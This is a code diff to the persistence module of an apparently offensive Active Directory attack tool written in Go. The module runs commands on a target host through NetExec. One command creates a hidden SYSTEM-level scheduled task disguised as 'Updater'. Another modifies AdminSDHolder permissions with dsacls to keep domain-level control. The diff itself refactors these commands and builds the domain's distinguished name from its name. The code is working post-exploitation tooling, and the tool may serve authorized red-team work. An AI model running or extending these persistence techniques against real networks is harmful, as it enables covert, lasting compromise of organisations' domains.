@@ -3,6 +3,7 @@ package modules
 import (
 	"context"
 	"fmt"
+	"strings"
 	"time"
 
 	"adpack/core"
@@ -33,9 +34,7 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 	}
 
 	fmt.Println("[*] Creating scheduled task persistence...")
-	taskCmd := fmt.Sprintf(
-		`schtasks /create /tn "Updater" /tr "powershell -c Start-Process -WindowStyle Hidden cmd.exe" /sc onlogon /ru SYSTEM /f`,
-	)
+	taskCmd := `schtasks /create /tn "Updater" /tr "powershell -c Start-Process -WindowStyle Hidden cmd.exe" /sc onlogon /ru SYSTEM /f`
 	r, err := tools.NetExec.Run(ctx, target, "-x", []string{taskCmd})
 	if err == nil && r.Success {
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
@@ -47,7 +46,8 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 	}
 
 	fmt.Println("[*] Attempting AdminSDHolder modification...")
-	sdCmd := `dsacls "CN=AdminSDHolder,CN=System,DC=$((Get-ADDomain).Name),DC=$((Get-ADDomain).Name)" /G "SYSTEM:GA" /I:T`
+	dn := fmt.Sprintf("CN=AdminSDHolder,CN=System,DC=%s", strings.ReplaceAll(domain, ".", ",DC="))
+	sdCmd := fmt.Sprintf(`dsacls "%s" /G "SYSTEM:GA" /I:T`, dn)
 	r, err = tools.NetExec.Run(ctx, target, "-x", []string{sdCmd})
 	if err == nil && r.Success {
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
